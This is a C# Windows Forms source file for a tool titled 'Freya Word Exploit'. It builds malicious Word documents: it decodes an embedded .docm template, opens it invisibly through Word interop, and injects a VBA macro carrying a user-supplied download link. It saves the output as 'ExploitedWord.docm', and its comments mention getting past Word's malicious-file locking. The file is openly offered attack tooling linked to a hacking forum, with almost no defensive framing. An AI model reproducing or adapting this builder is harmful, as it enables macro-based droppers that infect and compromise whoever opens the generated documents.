using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Vbe.Interop;
using Word = Microsoft.Office.Interop.Word.Application;
using Microsoft.Office.Interop.Word;
using System.CodeDom;
using Application = System.Windows.Forms.Application;
using System.IO;
using Freya_Word_Exploit__Not_Silent_.Properties;
using System.Diagnostics;
using System.Drawing;
using Point = System.Drawing.Point;

namespace Freya_Word_Exploit__Not_Silent_
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

            //We created a new file. And we print to it the converted bytes from base64. Because we need to copy the file to exploit.
            File.Create(@"C:\Users\" + Environment.UserName + @"\Desktop\Main.docm").Dispose();
            string file1 = @"C:\Users\" + Environment.UserName + @"\Desktop\Main.docm";
            byte[] bytes = Convert.FromBase64String(Resources.Base64);
            File.WriteAllBytes(file1, bytes);

            //Direct Download Link
            string ddl = textBox1.Text;

            #region Word API
            Microsoft.Office.Interop.Word.Application newApp = new Microsoft.Office.Interop.Word.Application();
            newApp.Visible = false;
            object Unknown = Type.Missing;
            var Source = file1;
            var doc = newApp.Documents.Open(Source);

            var project = doc.VBProject;
            var module = project.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule);
            #endregion


            //We use String.Split() method to change ddl variable in Macro in Resources. There are problems with operations ' " ' with other methods.
            var macro = Resources.macro;
            string[] spl;
            spl = macro.Split(',');
            spl[1] = @""" "+ ddl + @"""";
            string macro2 = spl[0] + "," + spl[1] + "," + spl[2] + "," + spl[3];

            //We have shown the macro used.
            MessageBox.Show(macro2, "Macro used:");

            //Here we inject the macro into the word file.
            module.CodeModule.AddFromString(macro2);

            //There was a small bug in this part. If I didn't type the newApp.Run command, Word would identify this file as malicious and lock it. But it was giving an error when typing. That's why we used Try, Catch blocks.
            try
            {
                newApp.Run("DoKbTest");
            }
            catch (Exception ex)
            {
                if (ex.ToString() != "")
                {
                    MessageBox.Show("Successfully exploited file!");
                }
            }

            //We saved the generated documentation.
            doc.SaveAs(@"C:\Users\" + Environment.UserName + @"\Desktop\ExploitedWord.docm");

            //We deleted the remaining unnecessary files.
            File.Delete(file1);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCpgGcLzqGtpMYkP8_PySS1g");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://turkhackteam.org/uye/endarion.955141/");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/Atalayagiz");
        }

        private void linkLabel3_MouseDown(object sender, MouseEventArgs e)
        {

        }

        private void linkLabel3_MouseMove(object sender, MouseEventArgs e)
        {

        }

        #region To make form moveable
        Point lastPoint;
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;

            }
        }
        #endregion
    }
}
